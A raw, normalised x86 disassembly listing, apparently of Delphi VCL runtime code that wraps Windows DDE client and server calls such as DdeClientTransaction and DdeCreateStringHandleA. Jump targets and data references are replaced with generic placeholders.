mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
sub_464f14
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_41969c
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_4139c8
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_465084
inc esi
sub_464f88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_464fcc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_464ffc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465077
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46507e
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_404054
lea eax [ ebx + 0x38 ]
call sub_403fbc
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_4648bc
mov edx ebx
call sub_419450
mov eax [ ebp - 0x4 ]
call sub_40427c
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_465084
sub_465084
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404010
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_4648f4
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404010
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_403fbc
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_4650e0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41969c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_4648bc
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_403fbc
sub_46511c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_403498
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_465164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403fbc
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_465198
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4651dc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_4654c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_465208
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push j_sub_4039c0#9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404054
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_404010
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_40427c
test eax eax
je r-xdata
mov eax esi
call sub_4654c0
mov eax esi
call sub_465390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4652ac
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_465408
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_403fbc
jmp r-xdata
sub_4652b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039c0#8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4653f8
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4041b4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_465390
jmp r-xdata
mov eax ebx
call sub_465520
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_465400
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465388
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov eax [ ebp - 0x8 ]
call sub_40427c
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_404488
mov [ eax + esi - 0x1 ] 0x20
sub_465390
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_465520
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_4652b4
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_465408
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_40427c
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_40447c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_4654c0
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_465500
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_465500
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_46552c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_465578
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4655b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403fbc
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_4655e4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_465694
pop esi
pop ebx
retn
sub_465610
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039c0#7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_407cf4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46568b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_465694
sub_465694
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push j_sub_4039c0#6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_4644f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465722
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_4644f8
sub_465728
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039c0#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4657b2
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_4041b4
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_465694
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_4657d0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41969c
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_4657f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov edx esi
mov eax [ rw-data ]
call sub_46455c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46583c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_464570
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_465870
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push j_sub_4039c0#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465902
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041b4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_465934
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_465978
push ebx
push esi
push edi
push ebp
call sub_4035f8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_40326c
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4193cc
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4139c8
call sub_40326c
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035e0
sub_4659fc
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039c0#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465b23
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_403fe0
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_40422c
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_465d48
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465ec0
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_40422c
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_46601c
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_41386c
mov edx ebx
mov eax esi
call sub_419450
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_40447c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_465b30
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_465e6c
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_413b0c
mov eax ebx
call sub_40326c
sub_465b60
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039c0#2
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465c0a
lea eax [ ebp - 0x1004 ]
call sub_403fbc
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_40422c
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_465d48
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_465728
mov esi eax
sub_465c14
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_465870
mov edx eax
sub_465c34
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_465d35
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_465e6c
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_40422c
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_465d48
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_465f38
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465d3c
lea eax [ ebp - 0x100c ]
call sub_403fbc
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_40427c
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_40447c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_465d48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_4199a4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4043c8
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465d48
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_419978
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_465e1c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4139c8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_4043c8
jne r-xdata
sub_465e6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4139c8
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_465ec0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_419380
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_465ef8
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_465f38
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039c0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_4040ac
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ff4
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_40427c
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_46601c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404010
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_40427c
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_40447c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_466078
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4660a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
